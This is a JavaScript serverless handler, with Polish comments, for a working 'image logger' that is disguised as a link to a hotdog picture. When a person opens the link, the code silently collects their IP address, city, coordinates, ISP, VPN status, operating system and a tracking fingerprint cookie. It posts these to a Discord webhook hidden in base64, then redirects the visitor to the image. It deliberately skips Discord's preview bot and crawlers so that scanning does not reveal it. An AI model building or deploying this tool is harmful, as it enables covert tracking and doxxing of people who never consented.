// ====================== KOALA IMAGE LOGGER ======================
// Szybki, z dużym obrazkiem, ignoruje boty Discord

// Funkcja dekodująca webhook z base64
function decodeWebhook(encoded) {
    try {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    } catch {
        return null;
    }
}

// Funkcja do generowania fingerprintu
function generateFingerprint(req) {
    const userAgent = req.headers['user-agent'] || '';
    const acceptLang = req.headers['accept-language'] || '';
    const acceptEncoding = req.headers['accept-encoding'] || '';
    
    let hash = 0;
    const data = `${userAgent}|${acceptLang}|${acceptEncoding}`;
    for (let i = 0; i < data.length; i++) {
        hash = ((hash << 5) - hash) + data.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash).toString(16);
}

export default async function handler(req, res) {
    // ========== UKRYTY WEBHOOK ==========
    const encodedWebhook = req.query.w;
    const oldWebhook = req.query.webhook;
    const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : oldWebhook;
    
    // ========== IP ==========
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
    
    // ========== WYKRYWANIE DISCORD BOTA ==========
    const ua = userAgent.toLowerCase();
    const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
    const isCrawler = ua.includes('bot') || ua.includes('crawler') || ua.includes('spider');
    
    // ========== JEŚLI TO BOT – SZYBKI OBRAZEK, NIE WYSYŁAJ WEBHOOKA ==========
    if (isDiscordBot || isCrawler) {
        // Szybkie przekierowanie do obrazka – bot dostaje tylko obrazek
        const fastImage = "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=800&height=400";
        res.redirect(302, fastImage);
        return;
    }
    
    // ========== FINGERPRINT ==========
    const fingerprint = generateFingerprint(req);
    const cookies = req.headers.cookie || '';
    const existingFingerprint = cookies.match(/fp=([^;]+)/)?.[1];
    const isReturning = existingFingerprint === fingerprint;
    
    // Ustaw ciasteczko
    res.setHeader('Set-Cookie', [`fp=${fingerprint}; Max-Age=2592000; Path=/; HttpOnly`]);
    
    // ========== GEOLOKALIZACJA ==========
    let geo = {
        country: 'Unknown', city: 'Unknown', lat: '?', lon: '?',
        org: 'Unknown', mobile: false, proxy: false
    };
    
    try {
        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoRes.json();
        if (!geoData.error) {
            geo = {
                country: geoData.country_name || 'Unknown',
                city: geoData.city || 'Unknown',
                lat: geoData.latitude || '?',
                lon: geoData.longitude || '?',
                org: geoData.org || 'Unknown',
                mobile: geoData.mobile || false,
                proxy: geoData.proxy || false
            };
        }
    } catch (e) {}
    
    // ========== WYKRYWANIE OS ==========
    let os = 'Unknown';
    if (ua.includes('windows nt 10.0')) os = 'Windows 10';
    else if (ua.includes('windows nt 11.0')) os = 'Windows 11';
    else if (ua.includes('mac os x')) os = 'macOS';
    else if (ua.includes('iphone')) os = 'iPhone';
    else if (ua.includes('android')) os = 'Android';
    else if (ua.includes('linux')) os = 'Linux';
    
    // ========== EMBED ==========
    const embed = {
        title: "🌭 HOTDOG!",
        description: `**Ktoś otworzył obrazek!**`,
        color: 0x5865F2,
        fields: [
            {
                name: "🌐 IP & LOKALIZACJA",
                value: `\`\`\`\nIP: ${ip}\n${geo.country}, ${geo.city}\nDostawca: ${geo.org}\nKoordynaty: ${geo.lat}, ${geo.lon}\nMobile: ${geo.mobile ? '✅ Tak' : '❌ Nie'}\nVPN/Proxy: ${geo.proxy ? '⚠️ Tak' : '❌ Nie'}\`\`\``,
                inline: false
            },
            {
                name: "💻 URZĄDZENIE",
                value: `\`\`\`\nSystem: ${os}\nFingerprint: ${fingerprint}\nNowy/Rozpoznany: ${isReturning ? 'Rozpoznany' : 'Nowy'}\n\`\`\``,
                inline: true
            },
            {
                name: "⏱️ CZAS",
                value: `\`\`\`\n${time}\n\`\`\``,
                inline: true
            }
        ],
        footer: { text: "KOALA Image Logger" },
        timestamp: new Date().toISOString(),
        image: {
            url: "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=800&height=400"
        }
    };
    
    // ========== WYŚLIJ WEBHOOK ==========
    if (finalWebhook) {
        try {
            await fetch(finalWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch (e) {}
    }
    
    // ========== DUŻY OBRAZEK ==========
    // Przekieruj do dużego, ładnego obrazka hotdoga
    const bigImage = "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=800&height=400";
    res.redirect(302, bigImage);
}
